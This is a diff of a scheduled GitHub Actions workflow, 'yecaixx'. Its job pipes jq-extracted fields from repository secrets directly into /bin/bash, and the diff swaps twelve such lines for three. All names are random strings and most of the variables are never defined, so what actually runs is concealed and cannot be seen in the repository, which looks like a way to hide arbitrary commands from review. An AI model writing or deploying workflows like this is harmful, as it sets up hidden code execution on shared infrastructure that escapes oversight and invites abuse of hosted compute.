@@ -3,26 +3,18 @@ name: yecaixx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 3/6 * * *'
-jobs:  # 16980
+    - cron: '3 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yecaixx
         env:
-          h206: ${{ secrets.h206 }}
+          jk2: ${{ secrets.jk2 }}
         run: |
-          echo $h206 | jq -r .ztq86 | /bin/bash
-          echo $s621 | jq -r .kb735 | /bin/bash
-          echo $go3913 | jq -r .gag2460 | /bin/bash
-          echo $zvwie70 | jq -r .gporv3697 | /bin/bash
-          echo $qnyr559 | jq -r .vnrpu0 | /bin/bash
-          echo $lrytc9 | jq -r .qudk314 | /bin/bash
-          echo $v156 | jq -r .ob249 | /bin/bash
-          echo $nkt2803 | jq -r .pov83 | /bin/bash
-          echo $paau5 | jq -r .cwwce2900 | /bin/bash
-          echo $inbk61 | jq -r .x15 | /bin/bash
-          echo $w351 | jq -r .yhv007 | /bin/bash
-          echo $onifb9673 | jq -r .z58034 | /bin/bash
+          echo $jk2 | jq -r .ql4 | /bin/bash
+          echo $vpz563 | jq -r .xqx57762 | /bin/bash
+          echo $ii1 | jq -r .y69762 | /bin/bash
 
